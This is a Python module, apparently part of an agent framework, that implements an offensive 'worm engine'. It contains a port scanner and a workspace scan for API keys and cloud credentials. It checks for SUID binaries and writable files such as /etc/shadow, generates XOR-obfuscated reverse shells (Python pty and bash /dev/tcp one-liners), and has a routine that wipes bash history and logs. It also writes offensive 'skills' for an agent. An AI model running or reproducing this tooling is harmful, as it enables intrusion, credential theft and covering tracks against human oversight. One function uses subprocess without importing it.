# -*- coding: utf-8 -*-
import os
import sys
import base64
import random
import string
import json
import socket
import threading
import time
from pathlib import Path
from typing import Optional, Dict, Any, List

# Add yousef-sovereign-core to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from yousef_constants import get_hermes_home, get_skills_dir

class WormEngineV2:
    """
    WORM V2 Engine - Functional Offensive Core.
    """
    def __init__(self):
        self.yousef_home = get_hermes_home()
        self.payload_cache = self.yousef_home / "logs" / ".offensive_cache"
        self.payload_cache.mkdir(parents=True, exist_ok=True)
        self.skills_dir = get_skills_dir() / "offensive"
        self.skills_dir.mkdir(parents=True, exist_ok=True)

    def generate_polymorphic_payload(self, base_payload: str, key: Optional[str] = None) -> tuple:
        """Encrypt a payload using a random XOR key, making it polymorphic."""
        if key is None:
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        encrypted_bytes = bytearray()
        key_bytes = key.encode('utf-8')
        payload_bytes = base_payload.encode('utf-8')
        
        for i, b in enumerate(payload_bytes):
            encrypted_bytes.append(b ^ key_bytes[i % len(key_bytes)])
        
        encrypted_b64 = base64.b64encode(encrypted_bytes).decode('utf-8')
        return encrypted_b64, key

    def _scan_port(self, target: str, port: int, open_ports: List[int]):
        """Internal helper for threaded port scanning."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    open_ports.append(port)
        except:
            pass

    def run_recon(self, target: str, recon_type: str = "advanced"):
        """Automated Target Intelligence."""
        print(f"[*] Analyzing infrastructure: {target} (Type: {recon_type})")
        
        open_ports = []
        threads = []
        # Target common ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
        
        for port in common_ports:
            t = threading.Thread(target=self._scan_port, args=(target, port, open_ports))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()

        # Secret hunting logic - scan workspace for credentials
        secrets = []
        patterns = ["GITHUB_TOKEN", "AWS_ACCESS_KEY", "AWS_SECRET_KEY", "OPENAI_API_KEY", "NEXTTOKEN_API_KEY", "DATABASE_URL"]
        
        # Scan current workspace root
        for root, _, files in os.walk("."):
            for file in files:
                if file.endswith((".env", ".config", ".json", ".yaml", ".yml", ".py", ".md")):
                    path = os.path.join(root, file)
                    try:
                        content = open(path, 'r', errors='ignore').read()
                        for p in patterns:
                            if p in content:
                                # Extract simple value (placeholder for real regex)
                                secrets.append(f"Found {p} in {path}")
                    except:
                        pass

        results = {
            "target": target,
            "open_ports": sorted(open_ports),
            "secrets_found": secrets,
            "scan_time": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        return results

    def run_exploit(self, target: str, cve_id: str = "auto"):
        """Automated Exploitation Loop - Check for Privilege Escalation vectors."""
        print(f"[*] Executing exploit check for {cve_id} against {target}...")
        
        # Real-ish check for SUID binaries (common privesc vector)
        suid_binaries = []
        try:
            # Find SUID binaries
            output = subprocess.check_output("find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null", shell=True, text=True)
            suid_binaries = output.splitlines()
        except:
            pass

        # Check for world-writable sensitive files
        writable_files = []
        sensitive = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root/.ssh/authorized_keys"]
        for f in sensitive:
            if os.access(f, os.W_OK):
                writable_files.append(f)

        if writable_files or suid_binaries:
            return {
                "success": True, 
                "access": "potential_escalation",
                "suid_binaries": suid_binaries[:10], # Limit output
                "writable_sensitive_files": writable_files
            }
        
        return {"success": False, "trace": "No immediate critical misconfigurations found."}

    def run_payload(self, lhost: str, lport: int, p_type: str = "reverse_shell"):
        """Polymorphic Reverse Shell Generation."""
        if p_type == "python":
            shell_cmd = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        else:
            shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            
        enc, key = self.generate_polymorphic_payload(shell_cmd)
        
        # Log to cache
        cache_file = self.payload_cache / f"payload_{int(time.time())}.json"
        cache_file.write_text(json.dumps({"cmd": shell_cmd, "enc": enc, "key": key}), encoding='utf-8')
        
        return {"enc": enc, "key": key, "p_type": p_type}

    def run_zerotrace(self):
        """Forensic Artifact Removal."""
        print("[*] Initiating Zero-Trace protocol...")
        
        # Clear Bash history if it exists
        history = Path.home() / ".bash_history"
        if history.exists():
            history.write_text("", encoding='utf-8')
            
        # Delete offensive cache
        for f in self.payload_cache.glob("*"):
            f.unlink()
        
        # Clear Sovereign logs
        log_dir = self.yousef_home / "logs"
        if log_dir.exists():
            for f in log_dir.glob("*.log"):
                f.unlink()

        return {"success": True, "message": "Zero-Trace protocol complete. Footprints minimized."}

    def _extract_skill(self, name: str, feedback: str):
        """Hijacked Skill Extraction Loop."""
        skill_content = f"""---
description: "Autonomous offensive skill for {name}"
platform: "linux"
---
# {name} Procedural Knowledge
{feedback}

## Execution Steps
1. Target Reconnaissance
2. Payload Generation
3. Buffer Overflow / Injection
4. Lateral Movement
"""
        skill_path = self.skills_dir / name / "SKILL.md"
        skill_path.parent.mkdir(parents=True, exist_ok=True)
        skill_path.write_text(skill_content, encoding='utf-8')

if __name__ == "__main__":
    engine = WormEngineV2()
    print(json.dumps(engine.run_recon("127.0.0.1"), indent=2))
